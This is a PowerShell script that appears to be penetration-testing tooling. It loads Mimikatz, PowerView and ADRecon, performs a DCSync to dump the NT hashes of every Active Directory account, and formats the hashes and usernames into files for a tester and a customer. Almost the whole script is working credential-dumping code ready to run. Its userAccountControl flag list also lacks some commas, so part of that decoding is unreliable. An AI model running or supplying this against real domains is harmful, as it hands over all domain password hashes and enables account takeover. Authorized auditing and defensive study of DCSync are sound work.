# Author: LRVT - https://github.com/l4rm4nd/

# Variables
$DATE = $(get-date -f yyyyMMddThhmm)
$PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
$EXT = ".txt"
$LOGFILE = $PATH + $DATE + "_" + "DCSync_NTLM_LOGFILE" + $EXT
$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes_FINAL" + $EXT
$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users_FINAL" + $EXT
$PTFHASHES = $PATH + $DATE + "_" + "DCSync_NTLM_PTF_Hashes_FINAL" + $EXT
$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_CUSTOMER_Importfile_FINAL" + $EXT

# Helper function to convert user account control values
Function DecodeUserAccountControl ([int]$UAC) {
    $UACPropertyFlags = @(
        "SCRIPT",
        "ACCOUNTDISABLE",
        "RESERVED",
        "HOMEDIR_REQUIRED",
        "LOCKOUT",
        "PASSWD_NOTREQD",
        "PASSWD_CANT_CHANGE",
        "ENCRYPTED_TEXT_PWD_ALLOWED",
        "TEMP_DUPLICATE_ACCOUNT",
        "NORMAL_ACCOUNT",
        "RESERVED",
        "INTERDOMAIN_TRUST_ACCOUNT",
        "WORKSTATION_TRUST_ACCOUNT",
        "SERVER_TRUST_ACCOUNT",
        "RESERVED",
        "RESERVED",
        "DONT_EXPIRE_PASSWORD",
        "MNS_LOGON_ACCOUNT",
        "SMARTCARD_REQUIRED",
        "TRUSTED_FOR_DELEGATION",
        "NOT_DELEGATED",
        "USE_DES_KEY_ONLY",
        "DONT_REQ_PREAUTH",
        "PASSWORD_EXPIRED",
        "TRUSTED_TO_AUTH_FOR_DELEGATION",
        "RESERVED",
        "PARTIAL_SECRETS_ACCOUNT"
        "RESERVED"
        "RESERVED"
        "RESERVED"
        "RESERVED"
        "RESERVED"
    )
    return (0..($UACPropertyFlags.Length) | ? { $UAC -bAnd [math]::Pow(2, $_) } | % { $UACPropertyFlags[$_] }) -join ";"
}

# Load Mimikatz, PowerView, and ADRecon from local files
. .\Invoke-Mimikatz.ps1
. .\PowerView.ps1
. .\ADRecon.ps1

# Print out domain context
$domain = get-netdomain | Select-Object -property Name | foreach { $_.Name }

# Create directory for storage
New-Item -ItemType Directory -Force -Path $PATH | Out-Null

# Execute DCSync to export NT-Hashes
$command = '"log ' + $LOGFILE + '" "lsadump::dcsync /domain:' + $domain + ' /all /csv"'
Invoke-Mimikatz -Command $command | Out-Null

# Using ADRecon to extract user details
Invoke-ADRecon -method LDAP -Collect Users -OutputType CSV -ADROutputDir $PATH | Out-Null

# Create temporary NTLM only and users only files
(Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object { $_.Split("`t")[2] } > $HASHES
(Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object { $_.Split("`t")[1] } > $USERS

# Create hashfile for pentest factory and convert user account attributes
$csv_obj = (Import-csv -Delimiter "`t" -Path $LOGFILE -header ID, SAMACCOUNTNAME, HASH, TYPE) -notmatch '\[DC\]' -notmatch '\[rpc\]' -notmatch "mimikatz\(powershell\)" -notmatch "for logfile : OK" -notmatch '\$'
foreach ($row in $csv_obj) { $row.type = DecodeUserAccountControl $row.type }
$csv_obj | select -Property hash, type | ConvertTo-Csv -NoTypeInformation | Select-Object -skip 1 > $PTFHASHES 

# Create import file for customer
$File1 = Get-Content $USERS
$File2 = Get-Content $HASHES
for ($i = 0; $i -lt $File1.Count; $i++) {
    ('{0},{1}' -f $File1[$i], $File2[$i]) | Add-Content $IMPORTFILE
}

# Sort files into dirs
New-Item -Path $PATH\PTF -ItemType Directory | Out-Null
New-Item -Path $PATH\CUSTOMER -ItemType Directory | Out-Null
Move-Item -Path $PATH\CSV-Files\Users.csv -Destination $PATH\PTF\.
Move-Item -Path $PTFHASHES -Destination $PATH\PTF\.
Move-Item -Path $IMPORTFILE -Destination $PATH\CUSTOMER\.
Move-Item -Path $LOGFILE -Destination $PATH\CUSTOMER\.

# Cleanup
Remove-Item -Path $USERS
Remove-Item -Path $HASHES
Remove-Item -Path $PATH\CSV-Files\ -recurse

